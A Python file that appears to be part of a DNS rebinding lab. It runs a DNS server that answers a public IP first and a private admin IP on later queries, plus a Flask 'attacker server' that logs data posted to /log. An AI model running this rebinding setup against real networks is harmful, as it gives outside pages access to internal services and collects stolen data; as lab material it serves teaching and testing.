import threading
import time
from dnslib.server import DNSServer, DNSHandler, BaseResolver
from dnslib import RR, QTYPE, A
from flask import Flask, request, render_template

# The domain we will rebind (used by README/test)
REBIND_DOMAIN = 'rebind.local.'

# IPs used in the lab (must match docker-compose static IPs)
ATTACKER_IP = '8.8.8.8'  # public IP for DNS check to pass
ADMIN_IP = '172.28.0.5'      # admin service private IP

# Simple per-client toggle map
client_counts = {}

class RebindResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = request.q.qname
        qn = str(qname)
        qtype = request.q.qtype
        reply = request.reply()

        if qn.lower() == REBIND_DOMAIN and qtype == QTYPE.A:
            client = handler.client_address[0]
            c = client_counts.get(client, 0)
            # return attacker IP on first query, admin IP on later queries
            ip = ATTACKER_IP if c == 0 else ADMIN_IP
            client_counts[client] = c + 1
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=2))
        else:
            # NXDOMAIN for everything else
            pass
        return reply

# Simple Flask web app to act as the attacker's public webserver
app = Flask(__name__, template_folder='templates')

@app.route('/')
def index():
    return 'attacker server'

@app.route('/ui')
def ui():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    print('Attacker received log:', request.get_data(as_text=True))
    return 'ok'

def run_flask():
    app.run(host='0.0.0.0', port=80)

if __name__ == '__main__':
    resolver = RebindResolver()
    udp_server = DNSServer(resolver, port=53, address='0.0.0.0')
    tcp_server = DNSServer(resolver, port=53, tcp=True, address='0.0.0.0')

    t1 = threading.Thread(target=udp_server.start)
    t2 = threading.Thread(target=tcp_server.start)
    t3 = threading.Thread(target=run_flask)

    t1.start(); t2.start(); t3.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
